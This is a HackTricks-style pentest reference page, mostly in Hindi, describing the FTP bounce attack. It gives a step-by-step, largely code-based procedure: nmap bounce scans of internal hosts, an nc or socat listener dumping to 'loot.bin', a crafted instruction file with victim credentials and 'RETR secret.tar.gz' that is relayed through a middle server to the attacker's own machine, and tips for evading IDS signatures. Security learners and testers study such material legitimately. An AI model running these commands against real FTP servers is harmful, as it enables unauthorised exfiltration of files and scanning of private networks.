# FTP Bounce Download 2 of FTP File

{{#include ../../banners/hacktricks-training.md}}


## सारांश

यदि आपके पास किसी **bounce FTP server** तक पहुँच है, तो आप इसे किसी **another FTP server** (जहाँ आपके पास कुछ credentials हों) से फाइल अनुरोध करने और उस फाइल को अपने **your own server** पर डाउनलोड करने के लिए मजबूर कर सकते हैं।

## आवश्यकताएँ

- **FTP Middle server** में FTP valid credentials मौजूद हों
- **Victim FTP server** में FTP valid credentials मौजूद हों
- दोनों सर्वर `PORT` command स्वीकार करते हों (bounce FTP attack)
- आप **FTP Middle server** के किसी डायरेक्टरी में लिख (write) सकते हों
- Middle server के पास Victim FTP Server के अंदर आपसे **more access** होना चाहिए

## कदम

1. अपने **your own FTP server** से कनेक्ट करें और कनेक्शन को passive (`pasv` command) बनाएं ताकि यह किसी डायरेक्टरी में **listens** करे जहाँ victim service फाइल भेजेगा।
2. उस फाइल को तैयार करें जिसे FTP Middle server Victim server को भेजेगा (यह फ़ाइल **exploit script** होगी)। यह फ़ाइल plain text होगी जिसमें Victim server के खिलाफ authenticate करने, डायरेक्टरी बदलने और आपके **your own server** पर फाइल डाउनलोड करने के लिए आवश्यक कमांड होंगे।
3. **FTP Middle Server** से कनेक्ट करें और पिछली फाइल अपलोड करें।
4. FTP Middle server को Victim server के साथ **establish a connection** करने और exploit file भेजने के लिए कहें।
5. अपने FTP server पर फ़ाइल को **capture** करें।
6. FTP Middle server से exploit फाइल को **delete** करें।

## संभावित vulnerable bounce hosts की त्वरित जांच

- **Nmap** अभी भी FTP bounce checks को सपोर्ट करता है। संभावित middle server को सत्यापित करने का उदाहरण:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
यदि सर्वर तीसरे‑पक्ष `PORT` मानों को अस्वीकार करता है तो स्कैन विफल हो जाएगा; कुछ **embedded/legacy printers, NAS and appliance FTP daemons** अभी भी इसकी अनुमति देते हैं।

## Automating the 2nd FTP download

नीचे एक आधुनिक तरीका दिया गया है जिससे कमजोर मध्य FTP सर्वर के माध्यम से फ़ाइल खींची जा सकती है।

1. **Open a passive listener** अपने attack बॉक्स पर (कोई भी TCP sink काम करेगा):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **Note** अपना IP `A,B,C,D` के रूप में और port `P` को `p1,p2` के रूप में नोट करें (`p1 = P/256`, `p2 = P%256`)।

3. **Build the instruction file** जो middle server victim के लिए replay करेगा:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Upload & trigger from the middle server** (classic proxy FTP):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Grab the file** अपने listener से (`loot.bin`)।
6. **Clean up** middle server पर अपलोड की गई `instrs` फ़ाइल को साफ़ करें।

Notes:
- Padding (`dd ...`) इस बात को रोकता है कि RETR समाप्त होने से पहले control connection बंद हो जाए (large TCP window समस्या के बारे में क्लासिक writeups में चर्चा है)।
- कोई भी सर्विस जो **listen and dump TCP** कर सकती है वह FTP PASV socket की जगह ले सकती है (उदा., `socat -u TCP-LISTEN:2121,fork - > loot.bin`)।
- यदि middle server privileged ports को प्रतिबंधित करता है, तो `PORT` में उच्च पोर्ट का उपयोग करें और अपने listener को उसके अनुसार समायोजित करें।

## Extra tricks

- जब file relay ब्लॉक हो तो **port-scan internal hosts** करने के लिए bounceable FTP server का उपयोग करें:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- कुछ आधुनिक WAF/IDS (जैसे Juniper IPS) में विशेष रूप से **FTP:EXPLOIT:BOUNCE-ATTACK** के लिए signatures होते हैं; शोर करने वाले payloads या गायब padding उन्हें ट्रिगर कर सकते हैं।
- जब middle server "PORT to same host" प्रतिबंध लागू करता है, तो अपना **listener middle server पर ही रखें** (यदि आपके पास write/execute है) और बाद में कैप्चर की गई फ़ाइल को फ़ॉरवर्ड करें।

For a more detailed old-school walkthrough check: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## References

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
